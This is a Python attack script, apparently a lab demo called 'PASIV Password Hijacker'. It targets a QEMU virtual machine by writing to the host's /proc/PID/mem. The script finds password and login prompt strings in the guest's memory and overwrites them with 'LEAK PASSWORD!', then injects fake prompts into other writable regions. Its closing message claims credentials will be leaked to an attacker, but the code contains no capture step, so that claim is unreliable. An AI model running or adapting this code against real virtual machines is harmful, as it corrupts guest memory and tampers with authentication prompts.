#!/usr/bin/env python3
"""
PASIV Password Hijacker
Replace password prompts and inject malicious password collection strings
"""

import os
import sys
import subprocess

class PasswordHijacker:
    def __init__(self):
        self.vm_process = None
        self.writable_locations = []
        
    def find_vm_process(self):
        """Find the running QEMU VM process"""
        try:
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'qemu-system-x86_64' in line and 'ubuntu-desktop-vulnerable' in line:
                    parts = line.split()
                    self.vm_process = int(parts[1])
                    return True
            return False
        except Exception as e:
            print(f"❌ Error finding VM process: {e}")
            return False
    
    def find_writable_locations(self):
        """Find writable memory locations suitable for password prompt injection"""
        try:
            # Read memory maps
            with open(f'/proc/{self.vm_process}/maps', 'r') as f:
                maps = f.read()
                
            # Find writable regions with reasonable size
            writable_regions = []
            for line in maps.split('\n'):
                if line.strip() and 'rw-p' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        addr_range = parts[0]
                        if '-' in addr_range:
                            start_str, end_str = addr_range.split('-')
                            start_addr = int(start_str, 16)
                            end_addr = int(end_str, 16)
                            size = end_addr - start_addr
                            # Look for medium-sized writable regions
                            if 4096 < size < 1024 * 1024:  # 4KB to 1MB
                                writable_regions.append((start_addr, size))
            
            # Test which locations we can actually write to
            successful_locations = []
            with open(f'/proc/{self.vm_process}/mem', 'r+b') as mem_file:
                for start_addr, size in writable_regions[:10]:  # Test first 10
                    try:
                        # Test write at the beginning of the region
                        test_addr = start_addr + 100  # Offset to avoid headers
                        mem_file.seek(test_addr)
                        original_data = mem_file.read(16)
                        
                        # Try to write test data
                        mem_file.seek(test_addr)
                        test_data = b"TEST1234TEST1234"
                        mem_file.write(test_data)
                        mem_file.flush()
                        
                        # Verify write worked
                        mem_file.seek(test_addr)
                        verify_data = mem_file.read(16)
                        
                        if verify_data == test_data:
                            successful_locations.append((test_addr, size))
                            print(f"✅ Found writable location: 0x{test_addr:x} (size: {size} bytes)")
                            
                            # Restore original data
                            mem_file.seek(test_addr)
                            mem_file.write(original_data)
                            mem_file.flush()
                        
                    except (OSError, PermissionError):
                        continue
                        
            self.writable_locations = successful_locations
            return len(successful_locations) > 0
            
        except Exception as e:
            print(f"❌ Error finding writable locations: {e}")
            return False
    
    def inject_malicious_password_prompt(self, location_addr):
        """Inject a malicious password prompt at a specific location"""
        malicious_prompts = [
            "LEAK PASSWORD! Enter your password: ",
            "SECURITY BREACH! Password required: ",
            "HACKED! Submit password now: ",
            "COMPROMISED! Enter password: "
        ]
        
        selected_prompt = malicious_prompts[0]  # Use the first one
        
        try:
            with open(f'/proc/{self.vm_process}/mem', 'r+b') as mem_file:
                # Read original content
                mem_file.seek(location_addr)
                original_data = mem_file.read(len(selected_prompt))
                
                # Write malicious prompt
                mem_file.seek(location_addr)
                prompt_bytes = selected_prompt.encode('utf-8')
                mem_file.write(prompt_bytes)
                mem_file.flush()
                
                # Verify injection
                mem_file.seek(location_addr)
                verify_data = mem_file.read(len(selected_prompt))
                verify_text = verify_data.decode('utf-8', errors='ignore')
                
                if "LEAK PASSWORD" in verify_text:
                    print(f"✅ Malicious prompt injected at 0x{location_addr:x}")
                    print(f"   Content: '{verify_text.strip()}'")
                    return True
                else:
                    print(f"❌ Injection failed at 0x{location_addr:x}")
                    return False
                    
        except Exception as e:
            print(f"❌ Error injecting prompt at 0x{location_addr:x}: {e}")
            return False
    
    def search_and_replace_existing_passwords(self):
        """Search for existing password prompts and replace them"""
        password_patterns = [
            "Enter password",
            "Type password", 
            "Input password",
            "Password:",
            "Login:",
            "Enter PIN",
            "Unlock"
        ]
        
        replacements_made = 0
        
        try:
            # Read memory maps for writable regions
            with open(f'/proc/{self.vm_process}/maps', 'r') as f:
                maps = f.read()
                
            # Parse writable memory regions 
            memory_regions = []
            for line in maps.split('\n'):
                if line.strip() and 'rw' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        addr_range = parts[0]
                        if '-' in addr_range:
                            start_str, end_str = addr_range.split('-')
                            start_addr = int(start_str, 16)
                            end_addr = int(end_str, 16)
                            size = end_addr - start_addr
                            if 1024 < size < 10 * 1024 * 1024:  # 1KB to 10MB
                                memory_regions.append((start_addr, end_addr, size))
            
            # Search for password patterns in writable memory
            with open(f'/proc/{self.vm_process}/mem', 'r+b') as mem_file:
                for start_addr, end_addr, size in memory_regions[:20]:
                    try:
                        mem_file.seek(start_addr)
                        data = mem_file.read(size)
                        
                        for pattern in password_patterns:
                            pattern_bytes = pattern.encode('utf-8')
                            pos = data.find(pattern_bytes)
                            
                            if pos != -1:
                                actual_addr = start_addr + pos
                                replacement = "LEAK PASSWORD!"
                                
                                # Ensure replacement fits
                                if len(replacement) <= len(pattern):
                                    # Pad if needed
                                    replacement_bytes = replacement.ljust(len(pattern)).encode('utf-8')
                                    
                                    # Replace the text
                                    mem_file.seek(actual_addr)
                                    mem_file.write(replacement_bytes)
                                    mem_file.flush()
                                    
                                    print(f"✅ Replaced '{pattern}' with '{replacement}' at 0x{actual_addr:x}")
                                    replacements_made += 1
                                    
                    except (OSError, PermissionError):
                        continue
                        
        except Exception as e:
            print(f"❌ Error during search and replace: {e}")
            
        return replacements_made
    
    def run_password_attack(self):
        """Execute the complete password hijacking attack"""
        print("🔐 PASIV Password Hijacker - DMA Attack")
        print("=" * 60)
        
        # Find VM process
        print("🔍 Finding VM process...")
        if not self.find_vm_process():
            print("❌ No running VM found")
            return False
            
        print(f"✅ Found VM process: PID {self.vm_process}")
        
        # Step 1: Search and replace existing password prompts
        print(f"\n🎯 Step 1: Searching for existing password prompts...")
        replacements = self.search_and_replace_existing_passwords()
        if replacements > 0:
            print(f"✅ Successfully replaced {replacements} password prompts!")
        else:
            print("❌ No existing password prompts found in writable memory")
        
        # Step 2: Find writable locations for injection
        print(f"\n🎯 Step 2: Finding writable memory locations...")
        if not self.find_writable_locations():
            print("❌ No suitable writable locations found")
            return replacements > 0
            
        print(f"✅ Found {len(self.writable_locations)} writable locations")
        
        # Step 3: Inject malicious password prompts
        print(f"\n🎯 Step 3: Injecting malicious password prompts...")
        injection_count = 0
        for addr, size in self.writable_locations[:3]:  # Inject into first 3 locations
            if self.inject_malicious_password_prompt(addr):
                injection_count += 1
        
        print(f"\n🚨 PASSWORD HIJACKING ATTACK RESULTS:")
        print(f"🎯 Existing prompts replaced: {replacements}")
        print(f"🎯 Malicious prompts injected: {injection_count}")
        print(f"💀 Total password attack vectors: {replacements + injection_count}")
        
        if replacements > 0 or injection_count > 0:
            print(f"\n✅ PASSWORD HIJACKING SUCCESSFUL!")
            print(f"🔥 VM memory now contains malicious password prompts")
            print(f"💀 User credentials will be leaked to attacker")
        else:
            print(f"\n❌ Password hijacking failed")
            
        return (replacements + injection_count) > 0

def main():
    if os.geteuid() != 0:
        print("❌ Root privileges required for memory access")
        return 1
        
    hijacker = PasswordHijacker()
    success = hijacker.run_password_attack()
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main()) 